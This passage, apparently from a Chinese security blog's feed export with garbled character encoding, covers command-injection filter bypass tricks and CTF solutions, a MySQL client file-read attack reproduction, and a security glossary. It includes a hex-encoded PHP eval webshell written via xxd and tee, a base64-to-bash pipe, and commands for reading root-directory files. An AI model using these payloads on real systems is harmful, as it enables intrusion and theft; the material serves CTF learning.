&#x27;base64(payload)&#x27; | base64 -d | bash</span><br></pre></td></tr></table></figure><ul><li><p>è¿›åˆ¶ç»•è¿‡</p><p>shellè§£æå…«è¿›åˆ¶ï¼Œ<code>ls</code> â†’ <code>$&#39;\154&#39;$&#39;\163&#39;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ $&#x27;\154&#x27;$&#x27;\163&#x27;</span><br><span class="line">1                           jdk-8u333-linux-x64.tar.gz:Zone.Identifier  result.txt     ysoserial.jar:Zone.Identifier</span><br><span class="line">jdk-8u333-linux-x64.tar.gz  jdk8</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phpä¼ å‚æ—¶çš„æ ¼å¼</span></span><br><span class="line">$(printf <span class="string">&quot;\154\163&quot;</span>)</span><br><span class="line">$(<span class="keyword">echo</span> <span class="string">&quot;\154\163&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>è¿›åˆ¶è½¬æ¢</li></ul> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ echo $((2#111))</span><br><span class="line">7</span><br></pre></td></tr></table></figure></li></ul><h3 id="phpç»•è¿‡"><a href="#phpç»•è¿‡" class="headerlink" title="phpç»•è¿‡"></a>phpç»•è¿‡</h3><p>phpèŠ±æ ·å°±å¤šäº†ğŸ˜‹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -r &#x27;system(chr(108).chr(115))&#x27;</span><br></pre></td></tr></table></figure><h3 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h3><ol><li><p>æ’å…¥\</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat = ca\t = c\at = \cat</span><br></pre></td></tr></table></figure></li><li><p>æ’å…¥ç©ºå­—ç¬¦</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls = l&#x27;&#x27;s = l&quot;&quot;s = l&#x27;s&#x27; = l&quot;s&quot; ï¼ˆåªè¦æ’å…¥æˆå¯¹çš„å•åŒå¼•å·å°±å¯ä»¥ï¼‰</span><br><span class="line">= l$1s = l$&#123;asdfa&#125;s = l``s =  l$(``)s  =  l$(&#x27;&#x27;)s = l$(&quot;&quot;)s</span><br></pre></td></tr></table></figure><blockquote><p>$1~$9ä¸ºè„šæœ¬å‚æ•°</p><p>${xx}ä»£è¡¨å˜é‡å€¼,åªè¦xxæ²¡æœ‰å®šä¹‰å³å¯</p><p>å†…æ•›æ‰§è¡Œç©ºå‘½ä»¤</p></blockquote></li><li><p>å˜é‡æ‹¼æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=c;b=at;$a$b file</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>å…¶ä»–å‘½ä»¤ä»£æ›¿</p></li><li><p>æ–‡ä»¶åç”¨é€šé…ç¬¦</p></li></ol><h3 id="è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡"><a href="#è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡" class="headerlink" title="è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡"></a>è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡</h3><p>é‡å®šå‘ç¬¦å†™å…¥æ–‡ä»¶çš„æœ¬è´¨æ˜¯å°†<strong>æ ‡å‡†è¾“å…¥è¾“å‡ºåˆ°æ–‡ä»¶</strong>ä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 3c3f70687020406576616c28245f504f53545b277479736563275d293b3f3e|xxd -ps -r|tee shell.php</span><br></pre></td></tr></table></figure><blockquote><p>xxdï¼šç”¨äºå°†åå…­è¿›åˆ¶ç¼–ç çš„æ•°æ®è½¬æ¢å›åŸå§‹çš„äºŒè¿›åˆ¶æ•°æ®</p><ul><li><code>-ps</code>ï¼šæŒ‡å®šè¾“å‡ºæ ¼å¼ä¸ºçº¯ç²¹çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</li><li><code>-r</code>ï¼šè¡¨ç¤ºè¿›è¡Œåå‘æ“ä½œï¼Œå³å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®ã€‚</li></ul><p>teeï¼šåŒæ—¶å°†è¯»å–çš„æ ‡å‡†è¾“å…¥å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºå’ŒæŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>é¡ºç€è¿™ä¸ªæ€è·¯</p><p><img src="/../images/image-20230912231430079.png" alt="image-20230912231430079"></p><p><img src="/../images/image-20230912231439162.png" alt="image-20230912231439162"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command | dd of=file.txt</span><br><span class="line">command | cp /dev/stdin file.txt</span><br></pre></td></tr></table></figure><h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡</h3><ol><li><code>$&#123;IFS&#125;</code></li><li><code>$IFS</code>+ç©ºå­—ç¬¦</li><li>é‡å®šå‘ç¬¦</li><li><code>&#123;cat,flag.php&#125;</code></li><li>urlå‚æ•°ç¼–ç ï¼Œç©ºæ ¼%20ï¼Œåˆ¶è¡¨ç¬¦%09</li></ol><h3 id="ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡"><a href="#ç›®å½•åˆ†éš”ç¬¦-ç»•è¿‡" class="headerlink" title="ç›®å½•åˆ†éš”ç¬¦/ç»•è¿‡"></a>ç›®å½•åˆ†éš”ç¬¦<code>/</code>ç»•è¿‡</h3><ol><li><p>å¤šæ¡å‘½ä»¤æ‰§è¡Œï¼Œå…ˆcdåˆ°ç›®çš„ç›®å½•ï¼Œå†æ‰§è¡Œcatç­‰å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ..;cd ..;cd ..;cat flag</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&amp;&amp;ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿</p></blockquote></li><li><p>æˆªå–ç¯å¢ƒå˜é‡</p><p><code>env</code>æˆ–è€…<code>printenv</code>ï¼šæ‰“å°ç¯å¢ƒå˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ echo $&#123;PWD:0:1&#125;</span><br><span class="line">/</span><br></pre></td></tr></table></figure></li></ol><h3 id="å†…æ•›æ‰§è¡Œç»•è¿‡"><a href="#å†…æ•›æ‰§è¡Œç»•è¿‡" class="headerlink" title="å†…æ•›æ‰§è¡Œç»•è¿‡"></a>å†…æ•›æ‰§è¡Œç»•è¿‡</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat `ls`</span><br><span class="line">cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><h3 id="é•¿åº¦é™åˆ¶ç»•è¿‡"><a href="#é•¿åº¦é™åˆ¶ç»•è¿‡" class="headerlink" title="é•¿åº¦é™åˆ¶ç»•è¿‡"></a>é•¿åº¦é™åˆ¶ç»•è¿‡</h3><h5 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h5><ol><li><p>lsè¾“å‡ºçš„ç»“æœæ˜¯æŒ‰ç…§å­—å…¸æ’åºçš„</p><p><img src="/../images/image-20221017101847464.png" alt="image-20221017101847464"></p></li><li><p>\æ”¾åœ¨æŒ‡ä»¤çš„æœ€æœ«ç«¯ï¼Œè¡¨ç¤ºæŒ‡ä»¤è¿æ¥ä¸‹ä¸€è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat \</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">1</span></span><br><span class="line">da</span><br></pre></td></tr></table></figure></li><li><p><code>ls -t &gt; a</code>å°†æ–‡ä»¶åï¼ˆå‘½ä»¤ï¼‰æŒ‰æ—¶é—´é‡å®šå‘åˆ°è„šæœ¬æ–‡ä»¶aä¸­ï¼Œ<code>sh a</code>æ‰§è¡Œè„šæœ¬aã€‚</p><p>æ³¨ï¼šå°†æ‰§è¡Œçš„å‘½ä»¤ååºç”Ÿæˆã€‚<code>\\</code>æ˜¯ä¸ºäº†è½¬ä¹‰ï¼Œè®©æ–‡ä»¶åå¸¦ä¸Š\</p><img src="../images/1650186228_625bd7f4927774ad69919.png!small" alt="img" style="zoom:150%;" /></li><li><p>å•ç‹¬ä¸€ä¸ª<code>*</code>ä¼šå°†ç›®å½•ä¸‹çš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸æ’åºæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶åä¸ºå‘½ä»¤ï¼Œå…¶ä»–ä¸ºè¯¥å‘½ä»¤çš„å‚æ•°</p><p><code>echo hello</code></p><p><img src="/../images/image-20221017102117317.png" alt="image-20221017102117317"></p><p>åœ¨è¿™ä¸ªåŸºç¡€ä¸Š<code>*o</code>ä¹Ÿå¯ä»¥ï¼Œå°±æ˜¯å–å‡ºæ»¡è¶³æ­£åˆ™*oçš„æ–‡ä»¶åæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="/../images/image-20221017102322441.png" alt="image-20221017102322441"></p></li></ol><h5 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezrce"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezrce" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezrce</h5><p>ç»™å‡ºäº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¥å£ï¼Œæµ‹è¯•ä¹‹åå‘ç°é•¿åº¦é™åˆ¶ä¸º6,æ­£å¸¸æ€è·¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686.png" alt="image-20221107112233686"></p><p>ç„¶åå°è¯•è®¿é—®&#x2F;tmp&#x2F;aï¼ŒæœåŠ¡å™¨æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜<code>&gt;a</code>å…¶å®æ˜¯æ‰§è¡ŒæˆåŠŸäº†çš„ã€‚</p><ul><li><p>è§£æ³•1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºcpçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>cp /* .</code>ï¼Œå°†æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶å¤åˆ¶åˆ°å½“å‰ç›®å½•ä¸‹ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;flagå³å¯</p><p><img src="/../images/image-20221107113239425.png" alt="image-20221107113239425"></p></li><li><p>è§£æ³•2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åä¸ºnlçš„æ–‡ä»¶</p><p>ç¬¬äºŒæ¡å‘½ä»¤æ‰§è¡Œ<code>nl /*&gt;a</code>ï¼Œè¯»å–æ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°aä¸­ï¼Œç„¶åè®¿é—®&#x2F;tmp&#x2F;aå³å¯</p><p><img src="/../images/image-20221107113608245.png" alt="image-20221107113608245"></p></li><li><p>è§£æ³•3</p><p>è„šæœ¬ç›´æ¥å†™ğŸ</p></li></ul><h3 id="æ— æ•°å­—ç»•è¿‡"><a href="#æ— æ•°å­—ç»•è¿‡" class="headerlink" title="æ— æ•°å­—ç»•è¿‡"></a>æ— æ•°å­—ç»•è¿‡</h3><p>å®‰æ´µæ¯2020[Web-Bash-Vino0o0o]</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="variable">$white_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;$&#123;#&#125;\\(&lt;)\&#x27;0&#x27;</span>); </span><br><span class="line">    <span class="variable">$char_list</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$test</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$char_list</span> <span class="keyword">as</span> <span class="variable">$c</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$c</span>,<span class="variable">$white_list</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Cyzcc&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åªèƒ½ç”¨&#96;$</p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»å¤ç°</title>
      <link href="/2023/05/31/Mysql%20Client%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/"/>
      <url>/2023/05/31/Mysql%20Client%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql-Client-ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»"><a href="#Mysql-Client-ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»" class="headerlink" title="Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»"></a>Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»</h1><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><p><a href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></p><h2 id="åŸç†å’Œæ”»å‡»æ€è·¯"><a href="#åŸç†å’Œæ”»å‡»æ€è·¯" class="headerlink" title="åŸç†å’Œæ”»å‡»æ€è·¯"></a>åŸç†å’Œæ”»å‡»æ€è·¯</h2><p><a href="https://paper.seebug.org/1112/">CSS-T | Mysql Client ä»»æ„æ–‡ä»¶è¯»å–æ”»å‡»é“¾æ‹“å±•</a></p><p>ç®€å•çš„è¯´å°±æ˜¯</p><p><strong>æ­£å¸¸çš„æµç¨‹</strong></p><p>å¦‚æœå®¢æˆ·ç«¯è¦ç”¨load data local infile å°†æ–‡ä»¶æ’å…¥è¡¨ä¸­çš„è¯ï¼Œå®¢æˆ·ç«¯ä¼šå…ˆå‘ä¸€ä¸ªè¯·æ±‚åŒ…ï¼Œè¿™ä¸ªè¯·æ±‚åŒ…é‡ŒåŒ…å«äº†è¦æ’å…¥çš„æ–‡ä»¶çš„è·¯å¾„ã€‚è€ŒæœåŠ¡å™¨æ¥ä¸‹æ¥è¿”å›ä¸€ä¸ªResponse TABULARåŒ…ï¼Œé‡Œé¢åŒ…å«æ–‡ä»¶è·¯å¾„ï¼Œç„¶åå®¢æˆ·ç«¯å¾—åˆ°äº†è®¸å¯æ‰å¼€å§‹ä¼ è¾“æ–‡ä»¶ã€‚</p><p><strong>æ¼æ´äº§ç”Ÿç‚¹</strong></p><p><img src="/../images/291ea879-e6dd-46a6-af48-4dd927485670.png-w331s" alt="img"></p><blockquote><p><strong>æœåŠ¡ç«¯å¯ä»¥åœ¨ä»»ä½•æŸ¥è¯¢è¯­å¥åå›å¤æ–‡ä»¶ä¼ è¾“è¯·æ±‚</strong></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ªé€ æœåŠ¡ç«¯è¿”å›çš„Response TABULARåŒ…ï¼Œå¹¶åœ¨è¯¥åŒ…ä¸­æŒ‡å®šæƒ³è¦è¯»å–çš„æ–‡ä»¶ï¼Œå®¢æˆ·ç«¯å°±ä¼šæŠŠè¯¥æ–‡ä»¶çš„å†…å®¹è¿”å›ç»™æœåŠ¡ç«¯</p><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><ul><li><p>å®¢æˆ·ç«¯å¿…é¡»å¯ç”¨LOCAL-INFILE </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--local-infile=OFF å¯ä»¥ä¿®å¤ï¼Œæˆ–è€…æ›´æ”¹å…¨å±€å˜é‡local_infile(æˆ‘åœ¨5.7ä¸‹å‚æ•°å¯ä»¥ï¼Œæ›´æ”¹å…¨å±€å˜é‡ä¸è¡Œï¼Ÿï¼Ÿ)</span><br></pre></td></tr></table></figure></li><li><p>å®¢æˆ·ç«¯æ”¯æŒéSSLè¿æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿æ¥æ—¶å‚æ•°--ssl-mode=VERIFY_IDENTITY å¯ä»¥ä¿®å¤</span><br></pre></td></tr></table></figure></li><li><p>ç›®æ ‡web<strong>å­˜åœ¨è¿æ¥æ•°æ®åº“çš„åŠŸèƒ½</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“å¼±å£ä»¤æ‰«æï¼Œè¿æ¥æ£€æŸ¥</span><br><span class="line">ç½‘ç«™é‡è£…æ¼æ´ï¼ˆéœ€è¦è¿æ¥æ•°æ®åº“ï¼‰</span><br><span class="line">æ•°æ®è¿ç§»æœåŠ¡</span><br><span class="line">Excleä»æ•°æ®åº“ä¸­åŒæ­¥æ•°æ®åˆ°è¡¨æ ¼å†…</span><br></pre></td></tr></table></figure></li></ul><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„mysqléƒ½æ˜¯5.7ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p><code>mysql5.7</code>é»˜è®¤å¼€å¯</p><p><img src="/../images/image-20230523163445312.png" alt="image-20230523163445312"></p><p>æ³¨ï¼šä¸€å¼€å§‹ä½¿ç”¨æœåŠ¡ç«¯ä½¿ç”¨8ç‰ˆæœ¬ä¸è¡Œ</p><p>æ”»å‡»è€…ï¼ˆæœåŠ¡ç«¯ï¼‰èµ·è„šæœ¬</p><p><img src="/../images/image-20230523162503899.png" alt="image-20230523162503899"></p><p><img src="/../images/image-20230523162623757.png" alt="image-20230523162623757"></p><p>å—å®³è€…è¿æ¥</p><p><img src="/../images/image-20230523162534773.png" alt="image-20230523162534773"></p><p>æ”»å‡»è€…æŸ¥çœ‹<code>mysql.log</code></p><p><img src="/../images/image-20230523162727437.png" alt="image-20230523162727437"></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§åè¯ä¸æ¦‚å¿µ</title>
      <link href="/2023/05/30/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/"/>
      <url>/2023/05/30/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">å¸¸è§åè¯</th><th align="center">è§£é‡Š</th></tr></thead><tbody><tr><td align="center">0day(Zero-day)</td><td align="center">æ²¡æœ‰è¡¥ä¸çš„å®‰å…¨æ¼æ´</td></tr><tr><td align="center">Nday</td><td align="center">å®˜æ–¹å‘å¸ƒäº†è¡¥ä¸ï¼Œä½†è¯¥æ¼æ´ä»ç„¶å¤§é‡æœªä¿®å¤ï¼Œå­˜åœ¨ä¸€å®šå¯åˆ©ç”¨æ€§</td></tr><tr><td align="center">POC</td><td align="center">ä¸€æ®µæ— å®³çš„ç”¨æ¥è¯æ˜æ¼æ´å­˜åœ¨çš„ä»£ç </td></tr><tr><td align="center">EXPï¼ˆexploitï¼‰</td><td align="center">ä¸€æ®µå¯¹æ¼æ´å¦‚ä½•åˆ©ç”¨çš„è¯¦ç»†è¯´æ˜æˆ–è€…ä¸€ä¸ªæ¼”ç¤ºçš„æ¼æ´æ”»å‡»ä»£ç </td></tr><tr><td align="center">payloadï¼ˆæœ‰æ•ˆè½½è·ï¼‰</td><td align="center">æŒ‡æˆåŠŸ exploit ä¹‹åï¼ŒçœŸæ­£åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç æˆ–æŒ‡ä»¤</td></tr><tr><td align="center">CVE</td><td align="center">Common Vulnerabilities &amp; Exposures å…¬å…±æ¼æ´å’Œæš´éœ²      CVEç¼–å·â€“æ¼æ´æ ‡ç­¾</td></tr><tr><td align="center">ShellCode</td><td align="center">ä¸€æ®µ16è¿›åˆ¶æœºå™¨ç ï¼Œå¯åœ¨æš‚å­˜å™¨eipæº¢å‡ºåï¼Œå¡å…¥ä¸€æ®µå¯è®©CPUæ‰§è¡Œçš„shellcodeæœºå™¨ç ï¼Œä»è€Œæ‰§è¡Œä»»æ„æŒ‡ä»¤ï¼ŒEIP<code>å¯„å­˜å™¨ï¼Œå®ƒé‡Œé¢å­˜æ”¾çš„å€¼æ˜¯</code>CPU<code>ä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹</code>EIP<code>å¯„å­˜å™¨çš„å€¼æ¥æ‰§è¡Œ</code>shellcode</td></tr><tr><td align="center">FUZZ</td><td align="center">æ¨¡ç³Šæµ‹è¯•ï¼šéšæœºè¾“å…¥ï¼Œè§‚å¯Ÿè¾“</td></tr><tr><td align="center">CMS</td><td align="center">å†…å®¹ç®¡ç†ç³»ç»Ÿï¼šæŒ‡çš„æ˜¯ä¸€ç§å†…å®¹ç¼–è¾‘ç¨‹åºã€‚å°±åƒåœ¨åšå®¢å†™æ–‡ç« ä¸€æ ·ï¼Œä¸éœ€è¦æ‡‚å¾—ç¼–ç¨‹çš„äººï¼Œä¹Ÿå¯ä»¥é€šè¿‡CMSå‘å¸ƒï¼Œæ›´æ”¹ï¼Œç®¡ç†å†…å®¹ã€‚</td></tr><tr><td align="center">CNVD</td><td align="center">China National Vulnerability Database                                   å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°</td></tr><tr><td align="center">Rootkit</td><td align="center">è½½å…¥åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„æ¶æ„è½¯ä»¶ï¼Œå…·æœ‰rootæƒé™</td></tr><tr><td align="center">WAF</td><td align="center">Webåº”ç”¨é˜²ç«å¢™ï¼Œå…·æœ‰é’ˆå¯¹ HTTP&#x2F;HTTPS çš„å®‰å…¨ç­–ç•¥</td></tr><tr><td align="center">å ¡å’æœº</td><td align="center">ç›‘æ§å’Œè®°å½•è¿ç»´äººå‘˜å¯¹ç½‘ç»œå†…çš„æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€å®‰å…¨è®¾å¤‡ã€æ•°æ®åº“ç­‰è®¾å¤‡çš„æ“ä½œè¡Œä¸ºï¼Œä»¥ä¾¿é›†ä¸­æŠ¥è­¦ã€åŠæ—¶å¤„ç†åŠå®¡è®¡å®šè´£ã€‚</td></tr><tr><td align="center">å½©è™¹è¡¨</td><td align="center">ç©ºé—´æ¢æ—¶é—´ï¼Œé€šè¿‡å“ˆå¸Œç¢°æ’ç ´è§£å“ˆå¸Œå€¼</td></tr><tr><td align="center">ä¾›åº”é“¾æ”»å‡»</td><td align="center">æ”»å‡»è½¯ä»¶ä¾›åº”å•†ï¼Œå¦‚å‘æ›´æ–°ç¨‹åºä¸­æ³¨å…¥æœ¨é©¬</td></tr><tr><td align="center">æ²™ç®±</td><td align="center">è™šæ‹Ÿç³»ç»Ÿç¨‹åºï¼š     åœ¨éš”ç¦»ç¯å¢ƒä¸­ï¼Œç”¨ä»¥æµ‹è¯•ä¸å—ä¿¡ä»»çš„æ–‡ä»¶æˆ–åº”ç”¨ç¨‹åºç­‰è¡Œä¸ºçš„å·¥å…·</td></tr><tr><td align="center">åŸŸåæ³›è§£æ</td><td align="center"><code>*.a.com</code>æŒ‡å‘åŒä¸€IP</td></tr><tr><td align="center">OSINT</td><td align="center"><strong>å…¬å¼€æ¥æºæƒ…æŠ¥</strong>ï¼ˆOSINT, Open Source INTelligenceï¼‰æ˜¯ä»å…¬å¼€æ¥æºæ”¶é›†åˆ°çš„æƒ…æŠ¥</td></tr><tr><td align="center">IDS</td><td align="center">Intrusion Detection Systemï¼ˆå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼‰ï¼Œæ—è·¯éƒ¨ç½²</td></tr><tr><td align="center">IPS</td><td align="center">Intrusion Prevention Systemï¼ˆå…¥ä¾µé˜²å¾¡è®¾å¤‡ï¼‰ï¼Œä¸²è”éƒ¨ç½²</td></tr><tr><td align="center">SA</td><td align="center">Situation Awarenessï¼ˆæ€åŠ¿æ„ŸçŸ¥ï¼‰ï¼Œæ€åŠ¿æ„ŸçŸ¥æ˜¯ä¸€ç§åŸºäºç¯å¢ƒçš„ã€åŠ¨æ€ã€æ•´ä½“åœ°æ´æ‚‰å…¨ç½‘å®‰å…¨é£é™©çš„èƒ½åŠ›ã€‚å®ƒä»¥å®‰å…¨å¤§æ•°æ®ï¼ˆé‡‡é›†å…¨ç½‘æµé‡æ•°æ®å’Œå®‰å…¨é˜²æŠ¤è®¾å¤‡æ—¥å¿—ä¿¡æ¯ï¼‰ä¸ºåŸºç¡€ï¼Œä»å…¨å±€è§†è§’å¯¹å…¨ç½‘å®‰å…¨å¨èƒè¿›è¡Œå‘ç°è¯†åˆ«ã€ç†è§£åˆ†æå±•ç¤ºå’Œå“åº”å¤„ç½®ï¼Œå¹¶é¢„æµ‹å‘å±•è¶‹åŠ¿ï¼Œä¸ºåç»­ç½‘ç»œå®‰å…¨çš„ç›¸å…³å†³ç­–ä¸è¡ŒåŠ¨æä¾›æ•°æ®ä¾æ®ã€‚</td></tr><tr><td align="center">AV</td><td align="center">anti-virus killerï¼ˆåç—…æ¯’æ€æ‰‹ï¼‰ï¼Œé˜²ç—…æ¯’è½¯ä»¶å¦‚WinowsDefinderï¼Œ360</td></tr><tr><td align="center">ä¸Š&#x2F;ä¸‹æ¸¸ä»£ç†</td><td align="center">è¯·æ±‚ï¼šå®¢æˆ·ç«¯â†’ä¸‹æ¸¸ä»£ç†â†’ä¸Šæ¸¸ä»£ç†â†’æœåŠ¡ç«¯                                                                                                        å“åº”ï¼šæœåŠ¡ç«¯â†’ä¸Šæ¸¸ä»£ç†â†’ä¸‹æ¸¸ä»£ç†â†’å®¢æˆ·ç«¯</td></tr><tr><td align="center">RASP</td><td align="center">è¿è¡Œæ—¶åº”ç”¨ç¨‹åºè‡ªæˆ‘ä¿æŠ¤ï¼ˆ<code>Runtime application 